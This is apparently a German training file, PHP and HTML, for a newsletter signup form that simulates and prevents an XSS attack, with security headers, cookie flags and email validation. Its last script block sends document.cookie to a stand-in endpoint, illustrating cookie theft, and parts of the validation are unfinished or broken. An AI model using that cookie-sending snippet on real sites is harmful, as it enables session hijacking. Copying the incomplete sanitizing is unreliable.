<?php
    // Sicherheitsheader für PHP-Datei

    // Content Security Policy (CSP), die nur Inhalte von localhost zulässt
    header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-src 'none';");

    // Sicherer Cookie setzen mit HTTP-Only- und Secure-Flag
    session_set_cookie_params([
        'lifetime' => 0,       // Bis zum Schließen des Browsers gültig
        'path' => '/',
        'domain' => '',        // Leer für Standard-Domain
        'secure' => true,      // Nur über HTTPS senden
        'httponly' => true,    // Kein Zugriff durch JavaScript
        'samesite' => 'Strict' // Kein Cross-Site-Sending
    ]);

    session_start();
?>

<body>
    <main>
        <h1>Newsletter Anmeldungsformular zum Simulieren und verhindern eines XSS Angriffes</h2>
        <!-- Server und Port können aus der Action ausgelesen werden -->
        <form id="registerNews" method="POST" action="https://localhost/api/send">
        <!--    Das wäre die sicherere Variante
                    <form id="secureForm" action="/action.php">
        -->
          <label for="fname">Name:</label><br>
          <input type="text" id="name" name="name"><br>
          <!-- Input type text validiert keine Mailadressen
          label for="lname">E-Mail:</label><br>
          <input type="text" id="email" name="email"><br><br
          -->
          <label for="lname">E-Mail:</label><br>
          <input type="email" id="email" name="email"><br><br> <!-- Hier kommt es zu einer ersten Validierung auf gültige Mailadressen -->
          <input type="submit" value="Submit">
        </form> 
    </main>
</body>

<script>
        "use strict";
        function isValidEmail(email) {
            const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
            return emailPattern.test(email);
        }
        
        // TODO: wo muss ich die jetzt hinschreiben?
        function sanitizeInput(input) {
            const map = {
                '&': '&amp;',
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#039;'
            };
            return input.replace(/[&<>"']/g, (char) => map[char]);
        }

        function validateForm(event) {
            event.preventDefault();

            const form = document.getElementById("registerNews");
            const inputName = document.getElementById("name");
            const inputEmail = document.getElementById("email");

            const name = inputName.value;
            const email = inputEmail.value;

            let isValid = true;
            
            errorMail.textContent = "";


            if (!isValidEmail(email)) {
                document.getElementById("errorMail").innerHTML = "Bitte geben Sie eine gültige E-Mail Adresse ein!";
                errorMail.classList.remove("hidden");
                isValid = false;
            }

            if (isValid == true) {
                inputEmail.value = "";  
                errorMail.classList.add("hidden");
            } 
        }
        
        const contactForm = document.getElementById("registerNews");
        contactForm.addEventListener("submit", validateForm);
    </script>



<script>
    // Alle von JavaScript lesbaren Cookies an eine fremde URL senden
    fetch("https://localhost/api/send", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: "cookies=" + encodeURIComponent(document.cookie)
    });
</script>

